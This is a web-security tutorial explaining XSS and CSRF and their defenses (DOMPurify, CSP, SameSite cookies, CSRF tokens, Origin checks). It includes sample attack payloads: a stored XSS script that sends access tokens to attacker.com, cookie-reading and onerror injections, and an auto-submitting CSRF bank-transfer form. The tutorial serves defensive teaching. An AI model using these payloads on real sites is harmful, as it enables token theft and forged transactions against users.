> XSS injects malicious scripts into your pages. CSRF forges requests using a user's existing session. Both exploit browser trust. These are two of the most common — and most misunderstood — web vulnerabilities.

---

## Table of Contents

1. [XSS — Cross-Site Scripting](#1-xss--cross-site-scripting)
2. [Stored XSS](#2-stored-xss)
3. [Reflected XSS](#3-reflected-xss)
4. [DOM-Based XSS](#4-dom-based-xss)
5. [XSS Impact and What It Can Steal](#5-xss-impact-and-what-it-can-steal)
6. [XSS Defenses](#6-xss-defenses)
7. [CSRF — Cross-Site Request Forgery](#7-csrf--cross-site-request-forgery)
8. [How CSRF Works](#8-how-csrf-works)
9. [CSRF Defenses](#9-csrf-defenses)
10. [The Relationship Between XSS and CSRF](#10-the-relationship-between-xss-and-csrf)

---

## 1. XSS — Cross-Site Scripting

XSS injects JavaScript into a web page that other users view. The script runs in the victim's browser with full access to that page's context — DOM, cookies (unless httpOnly), API calls, everything the page can do.

The name is misleading — "cross-site" is historical. The script runs _on_ your site, with your site's permissions, even though it was written by the attacker.

---

## 2. Stored XSS

The payload is stored server-side and served to every user who views the content.

```
Attacker submits a book review:
  "Great read! <script>
    fetch('https://attacker.com/steal?t=' + localStorage.getItem('accessToken'));
  </script>"

This is stored in the database.

Every user who views the book review page:
  → Browser receives the page with the script
  → Browser executes it
  → Script sends the access token to the attacker
```

Stored XSS is the most dangerous variant — a single injected payload reaches every user who views that content, indefinitely.

---

## 3. Reflected XSS

The payload is in the request (usually URL) and reflected in the response.

```
URL: https://app.example.com/search?q=<script>alert(document.cookie)</script>

Vulnerable server:
  <h2>Results for: <script>alert(document.cookie)</script></h2>

Browser executes the script.

Attack vector: attacker crafts the URL and tricks victim into clicking it.
Only affects the user who clicks the link — not all visitors.
```

---

## 4. DOM-Based XSS

The payload is injected via client-side JavaScript, never touching the server.

```js
// VULNERABLE — writing URL content to DOM without sanitization
const search = new URLSearchParams(location.search).get("q");
document.getElementById("results").innerHTML = `Results for: ${search}`;

// URL: ?q=<img src=x onerror="stealTokens()">
// innerHTML parses as HTML → onerror fires → script runs
```

```js
// SAFE — use textContent for text, DOMPurify for HTML
import DOMPurify from "dompurify";

document.getElementById("results").textContent = `Results for: ${search}`;
// textContent: renders as literal text — no HTML parsing

// Only if you must render HTML:
document.getElementById("bio").innerHTML = DOMPurify.sanitize(userBio, {
  ALLOWED_TAGS: ["b", "i", "em", "a"],
  ALLOWED_ATTR: ["href"],
});
```

**Dangerous DOM sinks** — properties that execute injected code:

```
innerHTML, outerHTML          → parses as HTML, executes scripts
document.write()              → writes to document
eval(), setTimeout("string")  → executes strings as code
element.src (script tags)     → loads external script
element.href = "javascript:"  → executes JS URI
```

---

## 5. XSS Impact and What It Can Steal

```
Can steal:
  → Access tokens in localStorage / sessionStorage
  → Content visible on the page
  → Form input as it's typed (keylogging)
  → Can make API calls as the authenticated user

Cannot steal (with proper implementation):
  → httpOnly cookies (inaccessible to JavaScript — this is the point)

Can do beyond stealing:
  → Redirect the user to a phishing page
  → Modify page content (swap login forms)
  → Take screenshots via canvas API
  → Request camera/microphone access (if permissions exist)
  → Use the victim's browser as a proxy (BeEF framework)
  → Persist via service workers (even after page reload)
```

---

## 6. XSS Defenses

### React — Auto-Escaped by Default

```jsx
// SAFE — JSX escapes all expressions
const UserProfile = ({ bio }) => <p>{bio}</p>;
// Even if bio = "<script>...</script>", rendered as literal text

// DANGEROUS — bypasses React's escaping
<div dangerouslySetInnerHTML={{ __html: userBio }} />
// Only use when you MUST render HTML and have sanitized it
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }} />
```

### Content Security Policy

The strongest browser-level defense:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'

Effect:
  Injected <script>malicious code</script> → blocked (no nonce)
  Injected <script src="https://evil.com/steal.js"></script> → blocked (not in allowlist)
  React's own scripts (loaded from 'self') → allowed
```

### Server-Side Sanitization

For content that genuinely needs to be stored and rendered as HTML (rich text editors):

```ts
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window as any);

function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "li", "br"],
    ALLOWED_ATTR: ["href"],
  });
}

// Sanitize before storing
await db.post.create({ data: { content: sanitizeHtml(rawInput) } });
```

For plain text fields (names, emails, IDs): never allow HTML — use `textContent`, not `innerHTML`.

---

## 7. CSRF — Cross-Site Request Forgery

CSRF tricks a logged-in user's browser into making a request to your API without the user knowing. The browser automatically attaches cookies — the API can't tell the difference.

```
Conditions for CSRF to work:
  1. User is authenticated via cookie session
  2. The targeted action has predictable parameters
  3. Server doesn't distinguish legitimate from forged requests
```

---

## 8. How CSRF Works

```
User: logged into bank.com — has a session cookie

User visits evil.com in another tab.
evil.com contains:

  <form method="POST" action="https://bank.com/transfer" id="f">
    <input name="to" value="attacker_account_number">
    <input name="amount" value="5000">
  </form>
  <script>document.getElementById("f").submit()</script>

What happens:
  1. Form is submitted to bank.com
  2. Browser automatically attaches the bank.com session cookie
  3. bank.com receives: POST /transfer with valid session cookie
  4. From bank.com's view: the authenticated user made a transfer request
  5. Without CSRF protection: transfer goes through

The victim never saw a form — it was invisible and submitted automatically.
```

CSRF works with cookies — not Bearer tokens. The browser automatically includes cookies in any request to a matching domain. That's why Bearer token auth (with the token in memory, sent as a header) is immune to CSRF — the attacker can't set the Authorization header.

---

## 9. CSRF Defenses

### SameSite Cookie Attribute (Primary)

```
Set-Cookie: session=...; SameSite=Strict; HttpOnly; Secure

SameSite=Strict:
  Cookie is NEVER sent with cross-site requests.
  Form submission from evil.com → no cookie → unauthenticated → rejected.
  CSRF attack completely neutralized.

SameSite=Lax (browser default for most cookies):
  Cookie not sent with most cross-site requests.
  Exception: top-level navigation GET (clicking a link).
  Sufficient for most CSRF scenarios.

SameSite=None:
  Cookie always sent. Must pair with Secure.
  Only for legitimate cross-site scenarios (e.g., embedded widgets).
```

### CSRF Tokens (Defense in Depth)

Useful for older browsers, forms that don't use JS, or additional protection:

```
Server generates random token per session (or per form):
  <input type="hidden" name="_csrf" value="xKj29mP3...">

On submit, server verifies token matches expected value.

Why an attacker can't forge it:
  → Token is in the HTML response
  → Same-Origin Policy prevents evil.com from reading your site's HTML
  → Forged request from evil.com can't include the correct token
  → Server rejects it
```

### Verify Origin Header

```ts
// Middleware — check Origin header on state-changing requests
app.use((req, res, next) => {
  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method)) {
    const origin = req.headers.origin;
    const allowed = ["https://app.example.com", "https://admin.example.com"];

    if (origin && !allowed.includes(origin)) {
      return res.status(403).json({ message: "Forbidden" });
    }
  }
  next();
});
```

Origin header is set by browsers and cannot be spoofed by web pages (only by native apps or browser extensions with permissions).

---

## 10. The Relationship Between XSS and CSRF

```
XSS:
  Attacker injects code INTO your site
  Code runs with your site's full permissions
  Can steal localStorage tokens, make API calls, modify DOM

CSRF:
  Attacker uses user's browser to make requests FROM their site TO yours
  Browser auto-attaches cookies
  Can perform state-changing actions (transfers, password changes)

XSS defeats CSRF tokens:
  An XSS payload can read the CSRF token from the page
  Then include it in a forged request
  XSS → CSRF tokens become useless
  → Fix XSS first; CSRF tokens are secondary

Bearer token auth defeats CSRF:
  Token in memory → not auto-attached → attacker can't forge authenticated requests
  This is why memory-stored access tokens (not cookies) are immune to CSRF
```

---

## Summary

```
Stored XSS: payload in database → affects every user who views content
Reflected XSS: payload in URL → affects victim who clicks the link
DOM XSS: client-side injection via JS — server never sees it

XSS defenses:
  React: JSX auto-escapes — avoid dangerouslySetInnerHTML
  CSP: blocks unauthorized scripts — strongest browser defense
  DOMPurify: sanitize HTML before storing/rendering
  textContent over innerHTML for plain text

CSRF: browser auto-attaches cookies → forged cross-site requests
  Works on cookie-based auth, not Bearer token auth

CSRF defenses:
  SameSite=Strict: cookie never sent cross-site → CSRF impossible
  CSRF tokens: random value verified server-side
  Origin header verification: validate allowed origins
  Use Bearer tokens (in memory): inherently CSRF-immune
```

---
